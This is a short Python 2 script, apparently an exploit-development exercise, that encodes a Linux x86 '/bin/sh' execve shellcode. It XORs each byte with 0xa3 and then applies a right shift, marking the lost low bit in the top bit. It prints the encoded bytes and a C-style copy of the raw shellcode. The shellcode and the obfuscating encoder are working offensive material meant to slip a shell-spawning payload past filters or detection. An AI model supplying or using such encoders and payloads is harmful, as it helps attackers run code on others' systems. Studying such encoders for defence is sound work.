# XOR-SHR-Enocder-Decoder
#Shift Right + XOR Encoder
# Author Tarek Talaat
# Email : unix.geek2014@gmail.com

'''
Important Note: When you Shift Right and then you shift left again it won't be the same value.
Because shifting right will remove the first bit and when you shift left again the first bit will be "0".
So if the first bit was "1" and you shift right, the second bit will be now in the place of the first bit.
But if shift left again you will add zero at the first bit doesn't matter what was it before.

So to solve this we first will check if the first bit "0" or "1" if it's 0 so we will do nothing about it. But if it's "1"
then we need to remember that later so we can reverse it back to it's original bit. We will do that by adding "1" to the 7th bit "last bit"
Since shifting right will make the 7th bit "0" anyway. So we will use it as a mark.

'''
#!/usr/bin/python

# A simple bin/sh shellcode
buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
encoded = ""
encoded2 = ""
# Value to use for XOR
XOR = "\xa3"
for x in bytearray(buf):
    for xor in bytearray(XOR):
        encoded2 += '\\x'
        encoded2 += '%02x' % x
        # XOR the byte first with "a3"
        y = x ^ xor
         
        if int(y) & (1 << 0): # We check here the first bit of it's "1"  
            y = y >> 1        # Then we shift it right
            y = y + 0b10000000 # Now we add 1 to the last bit "our mark bit, remember that"
            encoded += '0x'
            encoded += '%02x,' % y
        else:                 # Here if the first bit was "0" already, then we just shift it right without adding anything.
            y = y >>1
            encoded += '0x'
            encoded += '%02x,' %y
#print "Encoded shellcode 
print "Encoded shellcode....\n"
print 'Len : %d' % len(bytearray(buf))
print encoded


print "\n"
print "Shellcode for c....\n"
print encoded2
